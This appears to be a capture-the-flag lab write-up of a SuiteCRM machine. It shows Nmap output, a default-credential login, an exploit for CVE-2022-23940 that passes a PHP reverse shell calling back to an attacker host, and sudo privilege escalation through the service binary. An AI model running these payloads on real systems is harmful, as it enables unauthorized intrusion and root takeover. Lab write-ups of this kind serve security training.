# Introduction

In this lab, attackers perform enumeration to identify potential vulnerabilities. Attackers conduct web enumeration and exploit CVE-2022-23940 to gain an initial foothold. Privilege escalation will be achieved by abusing sudo permissions. 
# Objective

- Enumerate services to identify the SuiteCRM instance running on the web server.
- Enumerate sudo permissions and identify the vulnerable service binary.
- Exploit the service binary with ../../../../../bin/bash to escalate privileges and gain root access.
# Information Gathering 

Nmap Scan results:

tarting Nmap 7.99 ( https://nmap.org ) at 2026-10-16 18:06 -0400  
NSE: Loaded 158 scripts for scanning.  
NSE: Script Pre-scanning.  
Initiating NSE at 18:06  
Completed NSE at 18:06, 0.00s elapsed  
Initiating NSE at 18:06  
Completed NSE at 18:06, 0.00s elapsed  
Initiating NSE at 18:06  
Completed NSE at 18:06, 0.00s elapsed  
Initiating Ping Scan at 18:06  
Scanning 192.168.150.146 [4 ports]  
Completed Ping Scan at 18:06, 0.10s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 18:06  
Completed Parallel DNS resolution of 1 host. at 18:06, 0.50s elapsed  
Initiating SYN Stealth Scan at 18:06  
Scanning 192.168.150.146 [65535 ports]  
Discovered open port 80/tcp on 192.168.150.146  
Discovered open port 22/tcp on 192.168.150.146  
Discovered open port 3306/tcp on 192.168.150.146  
Discovered open port 33060/tcp on 192.168.150.146  
SYN Stealth Scan Timing: About 25.29% done; ETC: 18:08 (0:01:32 remaining)  
SYN Stealth Scan Timing: About 56.61% done; ETC: 18:08 (0:00:47 remaining)  
Completed SYN Stealth Scan at 18:08, 93.43s elapsed (65535 total ports)  
Initiating Service scan at 18:08  
Scanning 4 services on 192.168.150.146  
Completed Service scan at 18:08, 6.18s elapsed (4 services on 1 host)  
NSE: Script scanning 192.168.150.146.  
Initiating NSE at 18:08  
Completed NSE at 18:08, 2.39s elapsed  
Initiating NSE at 18:08  
Completed NSE at 18:08, 0.68s elapsed  
Initiating NSE at 18:08  
Completed NSE at 18:08, 0.00s elapsed  
Nmap scan report for 192.168.150.146  
Host is up (0.059s latency).  
Not shown: 65531 closed tcp ports (reset)  
PORT      STATE SERVICE VERSION  
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:    
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)  
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)  
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)  
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))  
|_http-favicon: Unknown favicon MD5: ED9A8C7810E8C9FB7035B6C3147C9A3A  
|_http-server-header: Apache/2.4.38 (Debian)  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
| http-title: SuiteCRM  
|_Requested resource was index.php?action=Login&module=Users  
| http-robots.txt: 1 disallowed entry    
|_/  
3306/tcp  open  mysql   MySQL (unauthorized)  
33060/tcp open  mysqlx  MySQL X protocol listener  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Available ports ==🟡 22, 80, 3306, 33060 ==

After some light credential work, we are able to access the machine with the login creds admin admin. The target IP Address opens into a SuiteCRM login page which can be accessed. 

# Service Enumeration

 After some manual research into SuiteCRM vulnerabilities, there appears to be a known CVE 
 (CVE-2022-23940) that allows remote code execution (RCE) on the target address if credentials are known. 

For this exploit we used the script developer on this public Gitlab -> https://github.com/manuelz120/CVE-2022-23940

After downloading the proper python libraries, we are able to run the below payload with our specific local host and port to create a remote shell into the target machine.

	python3 exploit.py -h http://192.168.150.146 -u admin -p admin -P "php -r '\$sock=fsockopen(\"192.168.XXX.XXX\", 80); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

*This payload example can be found on the gitlab and utilizes a php reverse shell command.

With success, we are able to achieve a foothold on our local machine logged in as the user "www-data."

The local.txt file can be found in the home directory of the user.

# Privilege Escalation

Logged in as "www-data" we begin searching for an eligible privilege escalation technique. 

Luckily, the current user is able to run the "service" command after running 

	sudo -l
Results:
	/usr/sbin/service


Using this knowlege we can check GTFOBins for potential escalation command. 

According to GTFOBins, we can use the "service" command in a directory transversal attack to open a root shell. 

	sudo service ../../bin/sh

*This  command took several attempts at working as originally the command was being run as "sudo /usr/bin/service." However, this did not directly work as intended.*

With success, we gain a root shell after running the command! The root flag can be found in the root home directory. The machine is now solved!